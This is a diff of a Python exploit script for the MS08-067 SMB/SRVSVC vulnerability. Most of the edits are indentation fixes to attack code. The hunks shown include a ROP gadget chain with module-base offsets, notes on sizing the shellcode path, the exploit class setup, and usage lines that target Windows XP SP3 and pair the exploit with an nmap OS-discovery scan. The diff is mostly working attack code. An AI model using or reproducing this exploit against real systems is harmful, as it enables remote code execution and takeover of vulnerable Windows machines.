@@ -403,7 +403,7 @@ smb-exploit.py
         ret += struct.pack('<L', rvas[
                            'mov [eax+8], edx / mov [eax+0xc], ecx / mov [eax+0x10], ecx / ret'] + module_base)
         ret += struct.pack('<L', rvas['pop ecx / ret'] + module_base)
-       ret += gadget2[2]
+        ret += gadget2[2]
         ret += struct.pack('<L', rvas['mov [eax+0x10], ecx / ret'] + module_base)
         ret += struct.pack('<L', rvas['add eax, 8 / ret'] + module_base)
         ret += struct.pack('<L', rvas['jmp eax'] + module_base)
@@ -415,11 +415,11 @@ smb-exploit.py
         def __init__(self, target, os, port=445):
            super(SRVSVC_Exploit, self).__init__()
     
-            # MODIFIED HERE
-            # Changed __port to port ... not sure if that does anything. I'm a newb.
-            self.port = port
-            self.target = target
-            self.os = os
+           # MODIFIED HERE
+           # Changed __port to port ... not sure if that does anything. I'm a newb.
+           self.port = port
+           self.target = target
+           self.os = os
     
         def __DCEPacket(self):
             if (self.os == '1'):
@@ -490,7 +490,7 @@ smb-exploit.py
             # NEW HOTNESS
             # The Path Length and the "Actual Count" SMB parameter have to match.  Path length in bytes
             #   is double the ActualCount field.  MaxCount also seems to match.  These fields in the SMB protocol
-           #   store hex values in reverse byte order.  So: 36 01 00 00  => 00 00 01 36 => 310.  No idea why it's "doubled"
+            #   store hex values in reverse byte order.  So: 36 01 00 00  => 00 00 01 36 => 310.  No idea why it's "doubled"
             #   from 310 to 620.  620 = 410 shellcode + extra stuff in the path.
             MaxCount = "\x36\x01\x00\x00"  # Decimal 310. => Path length of 620.
             Offset = "\x00\x00\x00\x00"
@@ -522,16 +522,14 @@ smb-exploit.py
                     print 'Example: MS08_067_2018.py 192.168.1.1 6 445 -- for Windows XP SP3 English (NX)'
                     print 'Example: MS08_067_2018.py 192.168.1.1 7 445 -- for Windows XP SP3 English (AlwaysOn NX)'
                     print ''
-                   print 'FYI: nmap has a good OS discovery script that pairs well with this exploit:'
+                    print 'FYI: nmap has a good OS discovery script that pairs well with this exploit:'
                     print 'nmap -p 139,445 --script-args=unsafe=1 --script /usr/share/nmap/scripts/smb-os-discovery 192.168.1.1'
-                   print ''
+                    print ''
                     sys.exit(-1)
-    
-    
+        
     current = SRVSVC_Exploit(target, os, port)
     current.start()
     
-
 <p>&nbsp;</p>
 =======================================================
 
